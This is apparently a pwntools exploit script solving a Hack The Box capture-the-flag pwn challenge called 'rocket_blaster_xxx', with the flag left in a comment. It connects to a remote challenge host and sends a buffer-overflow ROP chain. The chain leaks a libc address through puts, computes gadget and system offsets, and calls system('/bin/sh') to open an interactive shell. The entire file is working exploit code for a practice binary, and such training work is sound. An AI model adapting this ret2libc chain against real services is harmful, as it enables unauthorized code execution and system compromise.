#!/bin/python
from pwn import *
exe = ELF('./rocket_blaster_xxx_patched')
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
# p = process(exe.path)
p = remote('83.136.252.214',35857 )
# context.terminal = ['foot']
# gdb.attach(p, gdbscript='''
#
#
#            ''')
#################exploiting#####################
pop_rdi = 0x000000000040159f
pop_rsi = 0x000000000040159d
pop_rdx = 0x000000000040159b
printf_plt = 0x4010f0
ret = 0x0000000000401588
puts = 0x4010e0
pop_rbp = 0x000000000040125d
main_back = 0x00000000004014ff
payload = b''.ljust(0x28)
payload += p64(ret)
payload +=  p64(pop_rdi)
payload += p64(0x404fc0)
payload += p64(puts)
payload += p64(main_back)
p.sendlineafter(b'>>',payload)
p.recvuntil(b'beta testing..\n')

leak_addr = u64(p.recv(6) + b'\0\0')
log.info(f'leak_addr: ' + hex(leak_addr))
libc_base = leak_addr - 0x1147d0
syscall = libc_base + 0x0000000000029db4
bin_sh = libc_base+ 0x1d8678
pop_rax = libc_base + 0x0000000000045eb0
system_libc = libc_base + 0x50d70
payload = b''.ljust(0x28)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system_libc)
p.sendlineafter(b'>>',payload)
#HTB{b00m_b00m_r0ck3t_2_th3_m00n}
##############the end###########################
p.interactive()
